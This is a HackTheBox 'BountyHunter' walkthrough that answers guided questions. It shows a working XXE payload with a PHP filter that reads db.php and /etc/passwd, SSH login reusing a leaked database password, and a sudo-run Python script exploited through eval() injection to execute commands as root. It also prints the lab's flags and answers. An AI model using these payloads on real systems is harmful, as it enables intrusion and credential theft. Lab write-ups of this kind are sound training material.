# 🐧 BountyHunter — HTB

![OS](https://img.shields.io/badge/OS-Linux-FCC624?style=flat-square&logo=linux&logoColor=black)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=flat-square)
![Platform](https://img.shields.io/badge/HackTheBox-Machine-9FEF00?style=flat-square&logo=hackthebox&logoColor=black)

> **TL;DR** — The report form sends URL+Base64-encoded XML → **XXE** via a PHP filter leaks `db.php` and `/etc/passwd` → the DB password is reused for SSH as `development` → `sudo` lets us run a ticket validator that passes attacker-controlled input to `eval()` → arbitrary code execution as root.

**Tags:** `XXE` · `PHP filter` · `credential reuse` · `sudo` · `eval() injection`

---

## 1. POST endpoint of the Bounty Report System form

Open the site and click the **Portal** tab:

![portaltab](portaltab.png)

It redirects to *Bounty Report System - Beta*. Submit some data and intercept the request with Burp — it's sent to `tracker_diRbPr00f314.php`.

> **Answer:** `tracker_diRbPr00f314.php`

## 2–3. Encoding and data format

Copy the `data` parameter from the request body into CyberChef:

![request](request.png)

**URL Decode** then **From Base64** returns the form fields as XML:

![cyberchef](image.png)

| Question | Answer |
|---|---|
| Second encoding (besides URL) | `base64` |
| Data format after decoding | `XML` |

## 4–5. Vulnerability (theory)

| Question | Answer |
|---|---|
| Attack using external entities in XML to read files | `XXE` |
| Can PHP filters bypass hidden PHP source? | `yes` |

## 6. `dbpassword` value in `db.php`

Burp flagged the endpoint as XXE-vulnerable with a sample payload; I adapt it to read `db.php` through a PHP base64 filter:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ENTITY xxe19z3b SYSTEM "php://filter/convert.base64-encode/resource=///var/www/html/db.php"> ]>
<bugreport>
  <title>&xxe19z3b;</title>
  <cwe></cwe>
  <cvss></cvss>
  <reward></reward>
</bugreport>
```

Base64 + URL-encode it (all special chars), then send. The response contains `db.php` as base64:

![xxe-payload](image-1.png)

Decoded:

```php
<?php
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```

> **Answer:** `m19RoAU0hP41A1sTsq6K`

## 7. User flag (`development`)

Guessing the DB password is reused for SSH. To find a username, I abuse the same XXE to read `/etc/passwd`:

![etc-passwd](image-2.png)

Testing users from the bottom up, the password works for `development` — SSH in and read the flag.

> `d9c361b5180baca4d61cc2f491d0f643`

## 8. File runnable as root without a password

```bash
sudo -l
```

```
User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

> **Answer:** `ticketValidator.py`

## 9. Dangerous method in `evaluate()`

```python
def evaluate(ticketFile):
    for i, x in enumerate(ticketFile.readlines()):
        ...
        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))   # <-- here
                ...
```

Validation only checks the number *before* the `+`. Everything after it is attacker-controlled and reaches `eval()` unchecked — arbitrary code execution instead of simple math.

> **Answer:** `eval`

## 10. Root flag

The script runs as root, so I craft a ticket (`ticket.md`) that satisfies the `% 7 == 4` check, then injects code after the `+`:

```markdown
# Skytrain Inc
## Ticket to Vancouver
__Ticket Code:__
**4+__import__('os').system('cat /root/root.txt')**
```

```
development@bountyhunter:~$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
ticket.md
Destination: Vancouver
c889523f40dd6bc326eb0e4b41051742
Invalid ticket.
```

> `c889523f40dd6bc326eb0e4b41051742`

---

## 🚩 Flags

| | |
|---|---|
| **User** | `d9c361b5180baca4d61cc2f491d0f643` |
| **Root** | `c889523f40dd6bc326eb0e4b41051742` |
